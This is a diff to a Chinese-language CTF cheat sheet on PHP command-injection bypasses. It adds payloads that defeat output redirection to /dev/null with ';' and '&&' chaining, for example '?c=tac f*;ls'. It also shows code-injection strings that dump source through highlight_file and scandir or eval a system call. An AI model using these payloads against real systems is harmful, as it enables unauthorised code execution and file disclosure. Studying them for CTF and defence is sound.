@@ -26,6 +26,18 @@
 
 * --命令绕过
 
+<br>
+
+黑洞绕过：system($c." >/dev/null 2>&1");
+
+* 双写分号绕过?c=tac f*;ls
+* 双写&&绕过?c=tac f*%26%26ls（注：星号被绕过可以用问号）
+* 它只会让分号后面的指令进入黑洞，所以这里直接绕过
+
+
+
+
+
 
 <br>
 
@@ -39,7 +51,7 @@
 * c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
 * c=eval(next(reset(get_defined_vars())));&1=;system("tac%20flag.php");
 * c=show_source(next(array_reverse(scandir(pos(localeconv())))));
-
+* c=highlight_file(next(array_reverse(scandir(dir))));
 <br>
 
 当include(c)时：直接使用协议绕过
